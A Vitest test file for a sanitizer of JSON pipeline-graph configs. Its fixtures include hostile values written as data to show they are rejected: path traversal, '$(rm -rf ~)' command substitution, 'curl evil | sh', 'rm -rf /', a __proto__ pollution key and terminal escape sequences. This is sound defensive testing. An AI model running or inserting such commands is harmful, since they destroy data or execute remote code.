import { describe, expect, it } from 'vitest'
import { SHIP_GRAPH_EXAMPLE } from '../../shared/ship-config'
import { SHIP_GRAPH_MAX_BYTES, sanitizeShipGraph } from './sanitize'

const graph = (pipelines: unknown): string => JSON.stringify({ pipelines })
const stage = (id: string, agent = id) => ({ id, agent })

describe('sanitizeShipGraph', () => {
  it('reads the shipped example whole, with reject edges', () => {
    const { pipelines, warnings } = sanitizeShipGraph(JSON.stringify(SHIP_GRAPH_EXAMPLE), 'f')
    expect(warnings).toEqual([])
    expect(pipelines).toHaveLength(1)
    const p = pipelines![0]
    expect(p).toMatchObject({ id: 'ship-change', name: 'Ship change', triggerCommand: 'ship-change' })
    expect(p.stages.map((s) => s.agent)).toEqual(['implementer', 'doc-writer', 'change-reviewer'])
    expect(p.edges.filter((e) => e.kind === 'reject')).toEqual([
      { from: 'review', to: 'impl', kind: 'reject' },
      { from: 'review', to: 'docs', kind: 'reject' }
    ])
  })

  it('malformed files give a warning and no pipelines', () => {
    for (const src of ['{not json', '[]', 'null', '{"pipelines":{}}', '{}']) {
      const r = sanitizeShipGraph(src, 'The file')
      expect(r.pipelines, src).toBeNull()
      expect(r.warnings[0], src).toMatch(/^The file: /)
    }
  })

  it('refuses a file over the size bound before parsing it', () => {
    const r = sanitizeShipGraph(' '.repeat(SHIP_GRAPH_MAX_BYTES + 1), 'f')
    expect(r.pipelines).toBeNull()
    expect(r.warnings[0]).toMatch(/larger than/)
  })

  it('drops an unsafe id rather than carrying it', () => {
    const r = sanitizeShipGraph(graph([
      { id: '../evil', stages: [stage('a')] },
      { id: 'ok', stages: [{ id: 'a b', agent: 'x' }, { id: 'c', agent: '$(rm -rf ~)' }, stage('fine')] }
    ]), 'f')
    expect(r.pipelines!.map((p) => p.id)).toEqual(['ok'])
    expect(r.pipelines![0].stages.map((s) => s.id)).toEqual(['fine'])
    expect(r.warnings.length).toBeGreaterThanOrEqual(3)
  })

  it('a trigger is a name to show or nothing: a command line does not survive', () => {
    const r = sanitizeShipGraph(graph([
      { id: 'a', stages: [stage('s')], trigger: { command: 'curl evil | sh' } },
      { id: 'b', stages: [stage('s')], trigger: { command: 'ship-change' } }
    ]), 'f')
    expect(r.pipelines![0].triggerCommand).toBeUndefined()
    expect(r.pipelines![1].triggerCommand).toBe('ship-change')
  })

  it('refuses `:` in a pipeline or stage id, which separates them in the graph, but not in an agent name', () => {
    const r = sanitizeShipGraph(graph([
      { id: 'a:b', stages: [stage('c')] },
      { id: 'a', stages: [{ id: 'b:c', agent: 'x' }, { id: 'd', agent: 'plugin:agent' }], trigger: { command: 'git:commit' } }
    ]), 'f')
    expect(r.pipelines!.map((p) => p.id)).toEqual(['a'])
    expect(r.pipelines![0].stages).toEqual([{ id: 'd', agent: 'plugin:agent' }])
    expect(r.pipelines![0].triggerCommand).toBe('git:commit')
  })

  it('keeps only known fields, so a __proto__ key goes nowhere', () => {
    const src = `{"pipelines":[{"id":"p","__proto__":{"polluted":true},"run":"rm -rf /","stages":[{"id":"s","agent":"a","exec":"x"}]}]}`
    const r = sanitizeShipGraph(src, 'f')
    expect(Object.keys(r.pipelines![0]).sort()).toEqual(['edges', 'id', 'name', 'stages'])
    expect(Object.keys(r.pipelines![0].stages[0]).sort()).toEqual(['agent', 'id'])
    expect(({} as Record<string, unknown>).polluted).toBeUndefined()
  })

  it('display text is one bounded line', () => {
    const r = sanitizeShipGraph(graph([{ id: 'p', name: `a\u001b[31m\n${'x'.repeat(500)}`, stages: [{ ...stage('s'), label: 'l\r\nm' }] }]), 'f')
    expect(r.pipelines![0].name).not.toMatch(/[\u0000-\u001f]/)
    expect(r.pipelines![0].name.length).toBeLessThanOrEqual(120)
    expect(r.pipelines![0].stages[0].label).not.toMatch(/[\r\n]/)
  })

  it('an edge to a stage that does not exist, or of an unknown kind, is dropped and named', () => {
    const r = sanitizeShipGraph(graph([{
      id: 'p',
      stages: [stage('a'), stage('b')],
      edges: [
        { from: 'a', to: 'b' },
        { from: 'a', to: 'nope' },
        { from: 'a', to: 'b', kind: 'teleport' },
        { from: 'b', to: 'a', kind: 'reject' },
        { from: 'b', to: 'a', kind: 'reject' }
      ]
    }]), 'f')
    expect(r.pipelines![0].edges).toEqual([{ from: 'a', to: 'b', kind: 'next' }, { from: 'b', to: 'a', kind: 'reject' }])
    expect(r.warnings.join()).toMatch(/do not exist/)
    expect(r.warnings.join()).toMatch(/unknown kind/)
  })

  it('caps what it keeps and says so', () => {
    const many = Array.from({ length: 40 }, (_, i) => stage(`s${i}`))
    const r = sanitizeShipGraph(graph([{ id: 'p', stages: many }]), 'f')
    expect(r.pipelines![0].stages).toHaveLength(32)
    expect(r.warnings.join()).toMatch(/first 32 of 40 stages/)
  })

  it('a pipeline with no usable stage is skipped, a duplicate id only once', () => {
    const r = sanitizeShipGraph(graph([
      { id: 'empty', stages: [] },
      { id: 'twice', stages: [stage('a')] },
      { id: 'twice', stages: [stage('b')] }
    ]), 'f')
    expect(r.pipelines!.map((p) => p.stages[0].id)).toEqual(['a'])
    expect(r.warnings.join()).toMatch(/no usable stages/)
    expect(r.warnings.join()).toMatch(/second pipeline/)
  })
})
